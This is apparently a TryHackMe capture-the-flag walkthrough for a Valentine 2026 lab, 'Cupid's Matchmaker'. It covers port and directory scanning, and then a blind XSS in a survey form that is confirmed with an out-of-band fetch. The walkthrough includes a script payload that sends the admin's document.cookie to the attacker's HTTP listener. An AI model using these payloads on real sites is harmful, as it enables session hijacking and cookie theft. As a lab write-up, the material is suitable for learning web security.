# Cupid's Matchmaker Walkthrough

## Intro
Welcome to the Cupid's Matchmaker challenge, here is the link to the [room](https://tryhackme.com/room/lafb2026e3) on TryHackMe.
This is an easy level challenge about a common web vulnerability, part of the Valentine 2026 event.

### Scenario 
Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! 💘No algorithms. No AI. Just genuine human connection  
  
You can access the web app here: `http://MACHINE_IP:5000`

<br/>

Whenever you feel ready press on "Start Machine" and connect via OpenVPN or by using the AttackBox.
Let's begin!

<br/>
<br/>

## The Challenge
Starting with a port scan:
```bash
rustscan -a 10.80.132.98 -r 0-65535  --ulimit 5000 -- -sV -sC
```

We can see it finds port 22 and 5000 as in all the other Valentine's challenges plus port 631 serving CUPS.
```
631/tcp open  ipp     syn-ack CUPS 2.4
|_http-title: Forbidden - CUPS v2.4.12
|_http-server-header: CUPS/2.4 IPP/2.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

Leaving that aside for the moment let's take a look at the website by navigating to `http://MACHINE_IP:5000` in our web browser.

In the meantime we start a directory scan:
```bash
gobuster dir -u http://http://10.80.132.98:5000/  -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```
It find `/admin` which redirects to `/login` where we need some username and password to log-in.

On the homepage, if we click on "start your journey" we reach `http://10.80.132.98:5000/survey` where we need to compile a survey form with our info to get the perfect matchmaking.

We can try to fill in with some fake test data and capture the request with Burp Suite to gather more info.
Not much more to see here, the form data gets passed as multiple body parameters containing the info we sumbitted.

Trying to inject some JavaScript code to test for XSS in the survey form with something as simple as:
```html
<script>alert("hello")</script>
```

This produces no results, but it does not mean that there is no XSS vuln here, the code might be executed in the server without producing output in our end.

We can try to test if that is the case by spinning up an HTTP server on our machine and injecting a JS that fetches a file from that server, if we see the request in our server logs it means that the vulnerability exists.

Set up the HTTP server:
```bash
python3 -m http.server
```

This will set up the HTTP server in the current working directory on port 8000, unless differently specified.
Now we can try to put in the form another payload, something like:
```html
<script>fetch('http://10.80.93.90:8000/test')</script>
```

Checking our logs:
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.80.132.98 - - [21/Feb/2026 22:42:37] code 404, message File not found
10.80.132.98 - - [21/Feb/2026 22:42:37] "GET /test HTTP/1.1" 404 -
```

We find the request, this means that the form is indeed vulnerable to XSS.

Since we have found a login form and have no credentials we can try to exploit that XSS to grab the session cookie with this:
```html
<script>fetch('http://10.80.93.90:8000/?test=' +document.cookie)</script>
```

And checking our logs we get:
```
10.80.139.225 - - [21/Feb/2026 23:00:59] "GET /?test=flag=THM{XSS_REDACTED HTTP/1.1" 200 -
```

The flag is already in the cookies and we have so concluded the task
--> REDACTED

<br/>
<br/>

Congratulations, you have successfully exploited the Blind XSS vulnerability to get the admin's cookie/flag.

Happy Valentine!

Hope you had fun following along and completing the challenge.

Catch you in the next CTF 😃 
